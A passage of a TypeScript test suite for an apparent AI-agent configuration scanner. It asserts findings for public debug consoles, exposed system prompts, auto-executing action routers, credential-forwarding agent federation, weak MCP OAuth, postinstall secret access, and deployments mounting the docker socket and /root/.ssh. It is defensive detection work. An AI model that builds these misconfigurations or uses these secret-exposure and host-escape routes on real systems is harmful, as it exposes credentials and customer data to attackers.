    expect(runtimeDebugConsoleFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_debug_console_config: true,
      agent_debug_console_enabled: true,
      agent_debug_console_public_endpoint: true,
      agent_debug_console_anonymous_access: true,
      agent_debug_console_auth_disabled: true,
      agent_debug_console_prompt_view_enabled: true,
      agent_debug_console_raw_context_visible: true,
      agent_debug_console_tool_schema_visible: true,
      agent_debug_console_tool_invocation_enabled: true,
      agent_debug_console_privileged_tool_authority: true,
      agent_debug_console_secret_context_visible: true,
      agent_debug_console_redaction_disabled: true,
      agent_debug_console_audit_logging_disabled: true,
      agent_debug_console_approval_required: false
    });
    expect(runtimeDebugConsoleFindings[0]?.matched_object.metadata.agent_debug_console_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "prompt_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeDebugConsoleFindings[0]?.severity).toBe("critical");
    expect(runtimeDebugConsoleFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDebugConsoleFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("${DEBUG_CONSOLE_TOKEN}");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("debug.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("support_agent_system_prompt");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("developer_override_prompt");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("debug_customer_email");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("confidential_debug_trace");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeDebugConsoleFindings[0])).not.toContain("memory.write_debug_summary");
    const runtimeDebugConsoleImpersonationFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-076"
    );
    expect(runtimeDebugConsoleImpersonationFindings).toHaveLength(1);
    expect(runtimeDebugConsoleImpersonationFindings[0]?.matched_object.path).toBe("debug/agent-playground.yaml");
    expect(runtimeDebugConsoleImpersonationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_debug_console_config: true,
      agent_debug_console_enabled: true,
      agent_debug_console_public_endpoint: true,
      agent_debug_console_auth_disabled: true,
      agent_debug_console_prompt_edit_enabled: true,
      agent_debug_console_impersonation_enabled: true,
      agent_debug_console_tool_invocation_enabled: true,
      agent_debug_console_privileged_tool_authority: true,
      agent_debug_console_write_authority: true,
      agent_debug_console_external_authority: true,
      agent_debug_console_secret_context_visible: true,
      agent_debug_console_redaction_disabled: true,
      agent_debug_console_audit_logging_disabled: true,
      agent_debug_console_approval_required: false
    });
    expect(
      runtimeDebugConsoleImpersonationFindings[0]?.matched_object.metadata.agent_debug_console_tool_authority_categories
    ).toEqual(["database_write", "external_response", "memory_write", "prompt_write", "secret_manager_access", "tool_call"]);
    expect(runtimeDebugConsoleImpersonationFindings[0]?.severity).toBe("critical");
    expect(runtimeDebugConsoleImpersonationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDebugConsoleImpersonationFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("${DEBUG_CONSOLE_TOKEN}");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain(
      "debug.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("support_agent_system_prompt");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("developer_override_prompt");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("debug_customer_email");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("debug_account_number");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("confidential_debug_trace");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain(
      "support_db.update_customer_record"
    );
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeDebugConsoleImpersonationFindings[0])).not.toContain("memory.write_debug_summary");
    const runtimeResponseStreamFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-064");
    expect(runtimeResponseStreamFindings).toHaveLength(1);
    expect(runtimeResponseStreamFindings[0]?.matched_object.path).toBe("responses/public-stream.yaml");
    expect(runtimeResponseStreamFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_response_exposure_config: true,
      agent_response_exposure_enabled: true,
      agent_response_exposure_public_endpoint: true,
      agent_response_exposure_anonymous_access: true,
      agent_response_exposure_auth_disabled: true,
      agent_response_exposure_streaming_enabled: true,
      agent_response_exposure_reasoning_visible: true,
      agent_response_exposure_tool_output_visible: true,
      agent_response_exposure_tool_argument_visible: true,
      agent_response_exposure_retrieval_visible: true,
      agent_response_exposure_memory_visible: true,
      agent_response_exposure_secret_context_visible: true,
      agent_response_exposure_redaction_disabled: true,
      agent_response_exposure_approval_required: false
    });
    expect(runtimeResponseStreamFindings[0]?.severity).toBe("critical");
    expect(runtimeResponseStreamFindings[0]?.confidence).toBe("very_high");
    expect(runtimeResponseStreamFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("${RESPONSE_STREAM_TOKEN}");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("stream.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("response_stream_customer_email");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("response_stream_account_number");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("confidential_response_stream_notes");
    expect(JSON.stringify(runtimeResponseStreamFindings[0])).not.toContain("response_stream_api_token");
    const runtimeResponseStreamPromptBoundaryFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-091"
    );
    expect(runtimeResponseStreamPromptBoundaryFindings).toHaveLength(1);
    expect(runtimeResponseStreamPromptBoundaryFindings[0]?.matched_object.path).toBe("responses/public-stream.yaml");
    expect(runtimeResponseStreamPromptBoundaryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_response_exposure_config: true,
      agent_response_exposure_enabled: true,
      agent_response_exposure_public_endpoint: true,
      agent_response_exposure_anonymous_access: true,
      agent_response_exposure_auth_disabled: true,
      agent_response_exposure_cors_broad: true,
      agent_response_exposure_streaming_enabled: true,
      agent_response_exposure_reasoning_visible: true,
      agent_response_exposure_system_prompt_visible: true,
      agent_response_exposure_developer_prompt_visible: true,
      agent_response_exposure_tool_output_visible: true,
      agent_response_exposure_tool_argument_visible: true,
      agent_response_exposure_retrieval_visible: true,
      agent_response_exposure_memory_visible: true,
      agent_response_exposure_secret_context_visible: true,
      agent_response_exposure_redaction_disabled: true,
      agent_response_exposure_approval_required: false
    });
    expect(runtimeResponseStreamPromptBoundaryFindings[0]?.severity).toBe("critical");
    expect(runtimeResponseStreamPromptBoundaryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeResponseStreamPromptBoundaryFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain("${RESPONSE_STREAM_TOKEN}");
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain(
      "stream.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain(
      "response_stream_customer_email"
    );
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain(
      "response_stream_account_number"
    );
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain(
      "confidential_response_stream_notes"
    );
    expect(JSON.stringify(runtimeResponseStreamPromptBoundaryFindings[0])).not.toContain("response_stream_api_token");
    const runtimeActionRouterFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-065");
    expect(runtimeActionRouterFindings).toHaveLength(1);
    expect(runtimeActionRouterFindings[0]?.matched_object.path).toBe("action-router/model-actions.yaml");
    expect(runtimeActionRouterFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_action_router_config: true,
      agent_action_router_enabled: true,
      agent_action_router_model_output_input: true,
      agent_action_router_untrusted_input: true,
      agent_action_router_schema_validation_disabled: true,
      agent_action_router_open_action_schema: true,
      agent_action_router_unknown_actions_allowed: true,
      agent_action_router_json_repair_enabled: true,
      agent_action_router_batch_execution_enabled: true,
      agent_action_router_auto_execute: true,
      agent_action_router_privileged_tool_authority: true,
      agent_action_router_redaction_disabled: true,
      agent_action_router_dry_run_disabled: true,
      agent_action_router_approval_required: false
    });
    expect(runtimeActionRouterFindings[0]?.matched_object.metadata.agent_action_router_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeActionRouterFindings[0]?.severity).toBe("critical");
    expect(runtimeActionRouterFindings[0]?.confidence).toBe("very_high");
    expect(runtimeActionRouterFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("${ACTION_ROUTER_TOKEN}");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("untrusted_customer_message");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("retrieved_runbook_instruction");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("shell.run_remediation");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("memory.write_action_summary");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("action_router_customer_email");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("action_router_account_number");
    expect(JSON.stringify(runtimeActionRouterFindings[0])).not.toContain("confidential_action_router_notes");
    const runtimeActionRouterOpenSchemaFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-104"
    );
    expect(runtimeActionRouterOpenSchemaFindings).toHaveLength(1);
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.path).toBe("action-router/model-actions.yaml");
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_action_router_config: true,
      agent_action_router_enabled: true,
      agent_action_router_model_output_input: true,
      agent_action_router_untrusted_input: true,
      agent_action_router_schema_validation_disabled: true,
      agent_action_router_strict_schema: false,
      agent_action_router_open_action_schema: true,
      agent_action_router_unknown_actions_allowed: true,
      agent_action_router_json_repair_enabled: true,
      agent_action_router_batch_execution_enabled: true,
      agent_action_router_auto_execute: true,
      agent_action_router_privileged_tool_authority: true,
      agent_action_router_write_authority: true,
      agent_action_router_external_authority: true,
      agent_action_router_memory_authority: true,
      agent_action_router_secret_access: true,
      agent_action_router_shell_authority: true,
      agent_action_router_sensitive_context: true,
      agent_action_router_pii_context: true,
      agent_action_router_redaction_disabled: true,
      agent_action_router_dry_run_disabled: true,
      agent_action_router_approval_required: false
    });
    expect(
      runtimeActionRouterOpenSchemaFindings[0]?.matched_object.metadata
        .agent_action_router_tool_authority_categories
    ).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.data_classes).toContain("secret");
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeActionRouterOpenSchemaFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeActionRouterOpenSchemaFindings[0]?.severity).toBe("critical");
    expect(runtimeActionRouterOpenSchemaFindings[0]?.confidence).toBe("very_high");
    expect(runtimeActionRouterOpenSchemaFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("${ACTION_ROUTER_TOKEN}");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("untrusted_customer_message");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("retrieved_runbook_instruction");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("shell.run_remediation");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("memory.write_action_summary");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("action_router_customer_email");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain("action_router_account_number");
    expect(JSON.stringify(runtimeActionRouterOpenSchemaFindings[0])).not.toContain(
      "confidential_action_router_notes"
    );
    const runtimeAgentFederationFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-037");
    expect(runtimeAgentFederationFindings).toHaveLength(1);
    expect(runtimeAgentFederationFindings[0]?.matched_object.path).toBe("agent-federation/remote-agents.yaml");
    expect(runtimeAgentFederationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_federation_config: true,
      agent_federation_provider: "a2a",
      agent_federation_remote: true,
      agent_federation_dynamic_discovery: true,
      agent_federation_untrusted_selector: true,
      agent_federation_auto_delegation_enabled: true,
      agent_federation_context_forwarding_enabled: true,
      agent_federation_sensitive_context_forwarding: true,
      agent_federation_credential_forwarding: true,
      agent_federation_identity_verification_missing: true,
      agent_federation_allowlist_missing: true,
      agent_federation_approval_required: false
    });
    expect(runtimeAgentFederationFindings[0]?.matched_object.metadata.agent_federation_destination_kinds).toEqual([
      "agent_registry",
      "remote_agent_card"
    ]);
    expect(runtimeAgentFederationFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentFederationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentFederationFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("${A2A_FEDERATION_TOKEN}");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("agents.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("refunds.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("partner-agent.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("refund-case-agent");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("partner-remediation-agent");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("customer_requested_agent");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("a2a_federation_customer_email");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("confidential_federated_case_notes");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentFederationFindings[0])).not.toContain("support_memory_summary");
    const runtimeAgentFederationCredentialFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-102"
    );
    expect(runtimeAgentFederationCredentialFindings).toHaveLength(1);
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.path).toBe(
      "agent-federation/remote-agents.yaml"
    );
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_federation_config: true,
      agent_federation_provider: "a2a",
      agent_federation_remote: true,
      agent_federation_dynamic_discovery: true,
      agent_federation_untrusted_selector: true,
      agent_federation_auto_delegation_enabled: true,
      agent_federation_context_forwarding_enabled: true,
      agent_federation_sensitive_context_forwarding: true,
      agent_federation_pii_context_forwarding: true,
      agent_federation_secret_forwarding: true,
      agent_federation_tool_result_forwarding: true,
      agent_federation_memory_forwarding: true,
      agent_federation_credential_forwarding: true,
      agent_federation_signature_verification_disabled: true,
      agent_federation_identity_verification_missing: true,
      agent_federation_allowlist_missing: true,
      agent_federation_approval_required: false
    });
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.metadata.agent_federation_destination_kinds).toEqual([
      "agent_registry",
      "remote_agent_card"
    ]);
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.data_classes).toContain("secret");
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeAgentFederationCredentialFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeAgentFederationCredentialFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentFederationCredentialFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentFederationCredentialFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("${A2A_FEDERATION_TOKEN}");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "agents.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "refunds.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "partner-agent.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("refund-case-agent");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("partner-remediation-agent");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("customer_requested_agent");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("support_memory_summary");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "support_db.update_customer_record"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("update_customer_record");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("submit_refund_form");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("escalate_support_case");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain("post_customer_reply");
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "a2a_federation_customer_email"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "a2a_federation_account_number"
    );
    expect(JSON.stringify(runtimeAgentFederationCredentialFindings[0])).not.toContain(
      "confidential_federated_case_notes"
    );
    const runtimeMcpAuthorizationFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-038");
    expect(runtimeMcpAuthorizationFindings).toHaveLength(1);
    expect(runtimeMcpAuthorizationFindings[0]?.matched_object.path).toBe("mcp-auth/oauth-client.yaml");
    expect(runtimeMcpAuthorizationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_mcp_authorization_config: true,
      mcp_authorization_provider: "mcp_oauth",
      mcp_authorization_remote: true,
      mcp_authorization_dynamic_client_registration: true,
      mcp_authorization_pkce_disabled: true,
      mcp_authorization_state_validation_disabled: true,
      mcp_authorization_resource_indicator_missing: true,
      mcp_authorization_broad_scope: true,
      mcp_authorization_refresh_token_storage: true,
      mcp_authorization_token_forwarding: true,
      mcp_authorization_untrusted_server: true,
      mcp_authorization_approval_required: false
    });
    expect(runtimeMcpAuthorizationFindings[0]?.matched_object.metadata.mcp_authorization_scope_kinds).toEqual([
      "agent_resource_scope",
      "broad_scope",
      "identity_or_pii_scope",
      "write_scope"
    ]);
    expect(runtimeMcpAuthorizationFindings[0]?.severity).toBe("critical");
    expect(runtimeMcpAuthorizationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeMcpAuthorizationFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("${MCP_OAUTH_CLIENT_SECRET}");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("oauth-mcp.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("authz.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("mcp:tools:*");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("customer_requested_mcp_server");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain("mcp_oauth_customer_email");
    expect(JSON.stringify(runtimeMcpAuthorizationFindings[0])).not.toContain(".auth/mcp-oauth-tokens.json");
    const supplyChainFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-001");
    expect(supplyChainFindings).toHaveLength(1);
    expect(supplyChainFindings[0]?.matched_object.path).toBe("package.json");
    expect(supplyChainFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_package_manifest_config: true,
      package_manifest_dependency_names_redacted: true,
      package_manifest_dependency_specs_redacted: true,
      package_manifest_dependency_count: 4,
      package_manifest_agent_dependency_count: 4,
      package_manifest_risky_dependency_count: 4,
      package_manifest_unpinned_dependency: true,
      package_manifest_remote_dependency: true,
      package_manifest_lifecycle_script: true,
      package_manifest_lifecycle_script_names: ["postinstall"],
      package_manifest_lifecycle_secret_env: true
    });
    expect(supplyChainFindings[0]?.matched_object.metadata.package_manifest_agent_dependency_categories).toEqual([
      "agent_framework",
      "mcp_sdk",
      "model_sdk",
      "rag_vector_store"
    ]);
    expect(supplyChainFindings[0]?.matched_object.metadata.package_manifest_dependency_reference_kinds).toEqual([
      "floating_range",
      "git_dependency",
      "http_tarball",
      "latest_tag"
    ]);
    expect(supplyChainFindings[0]?.severity).toBe("critical");
    expect(supplyChainFindings[0]?.confidence).toBe("very_high");
    expect(supplyChainFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("${AGENT_EXTENSION_TOKEN}");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("@agentcsp-demo/remote-rag-plugin");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("@openai/agents");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("openai-agents-fork");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("packages.example.invalid");
    expect(JSON.stringify(supplyChainFindings[0])).not.toContain("scripts/install-agent-plugins.js");
    const supplyChainBootstrapFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-003");
    expect(supplyChainBootstrapFindings).toHaveLength(1);
    expect(supplyChainBootstrapFindings[0]?.matched_object.path).toBe("package.json");
    expect(supplyChainBootstrapFindings[0]?.matched_object.data_classes).toEqual(["credential", "internal", "secret"]);
    expect(supplyChainBootstrapFindings[0]?.matched_object.actions).toEqual(["execute", "read", "send", "write"]);
    expect(supplyChainBootstrapFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_package_manifest_config: true,
      package_manifest_dependency_names_redacted: true,
      package_manifest_dependency_specs_redacted: true,
      package_manifest_dependency_count: 4,
      package_manifest_agent_dependency_count: 4,
      package_manifest_risky_dependency_count: 4,
      package_manifest_unpinned_dependency: true,
      package_manifest_remote_dependency: true,
      package_manifest_lifecycle_script: true,
      package_manifest_lifecycle_script_names: ["postinstall"],
      package_manifest_install_script_count: 1,
      package_manifest_lifecycle_shell_execution: true,
      package_manifest_lifecycle_secret_env: true
    });
    expect(supplyChainBootstrapFindings[0]?.matched_object.metadata.package_manifest_agent_dependency_categories).toEqual([
      "agent_framework",
      "mcp_sdk",
      "model_sdk",
      "rag_vector_store"
    ]);
    expect(supplyChainBootstrapFindings[0]?.matched_object.metadata.package_manifest_dependency_reference_kinds).toEqual([
      "floating_range",
      "git_dependency",
      "http_tarball",
      "latest_tag"
    ]);
    expect(supplyChainBootstrapFindings[0]?.severity).toBe("critical");
    expect(supplyChainBootstrapFindings[0]?.confidence).toBe("very_high");
    expect(supplyChainBootstrapFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("${AGENT_EXTENSION_TOKEN}");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("@agentcsp-demo/remote-rag-plugin");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("@openai/agents");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("openai-agents-fork");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("packages.example.invalid");
    expect(JSON.stringify(supplyChainBootstrapFindings[0])).not.toContain("scripts/install-agent-plugins.js");
    const supplyChainDeploymentFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-002");
    expect(supplyChainDeploymentFindings).toHaveLength(1);
    expect(supplyChainDeploymentFindings[0]?.matched_object.path).toBe("deployments/agent-deployment.yaml");
    expect(supplyChainDeploymentFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_deployment_config: true,
      agent_deployment_platform: "kubernetes",
      agent_deployment_agent_workload: true,
      agent_deployment_remote_image: true,
      agent_deployment_unpinned_image: true,
      agent_deployment_pull_policy_always: true,
      agent_deployment_privileged_container: true,
      agent_deployment_host_mount: true,
      agent_deployment_secret_env_exposure: true,
      agent_deployment_approval_required: false
    });
    expect(supplyChainDeploymentFindings[0]?.matched_object.metadata.agent_deployment_image_reference_kinds).toEqual([
      "latest_tag",
      "missing_digest",
      "mutable_tag",
      "remote_registry_image"
    ]);
    expect(supplyChainDeploymentFindings[0]?.matched_object.metadata.agent_deployment_mount_kinds).toEqual([
      "credential_path",
      "docker_socket",
      "host_path"
    ]);
    expect(supplyChainDeploymentFindings[0]?.severity).toBe("critical");
    expect(supplyChainDeploymentFindings[0]?.confidence).toBe("very_high");
    expect(supplyChainDeploymentFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("${AGENT_DEPLOY_TOKEN}");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("ghcr.io/agentcsp-demo/support-agent");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("support-agent:latest");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("agent-admin");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("agent-deploy-token");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("model-api-token");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("/var/run/docker.sock");
    expect(JSON.stringify(supplyChainDeploymentFindings[0])).not.toContain("/root/.ssh");
    const runtimeDeploymentHostEscapeFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-084"
    );
    expect(runtimeDeploymentHostEscapeFindings).toHaveLength(1);
    expect(runtimeDeploymentHostEscapeFindings[0]?.matched_object.path).toBe("deployments/agent-deployment.yaml");
    expect(runtimeDeploymentHostEscapeFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_deployment_config: true,
      agent_deployment_platform: "kubernetes",
      agent_deployment_agent_workload: true,
      agent_deployment_privileged_container: true,
      agent_deployment_root_user: true,
      agent_deployment_host_network: true,
      agent_deployment_host_mount: true,
      agent_deployment_credential_mount: true,
      agent_deployment_secret_env_exposure: true,
      agent_deployment_service_account_redacted: true,
      agent_deployment_approval_required: false
    });
    expect(runtimeDeploymentHostEscapeFindings[0]?.matched_object.metadata.agent_deployment_mount_kinds).toEqual([
      "credential_path",
      "docker_socket",
      "host_path"
    ]);
    expect(runtimeDeploymentHostEscapeFindings[0]?.severity).toBe("critical");
    expect(runtimeDeploymentHostEscapeFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDeploymentHostEscapeFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("${AGENT_DEPLOY_TOKEN}");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("ghcr.io/agentcsp-demo/support-agent");
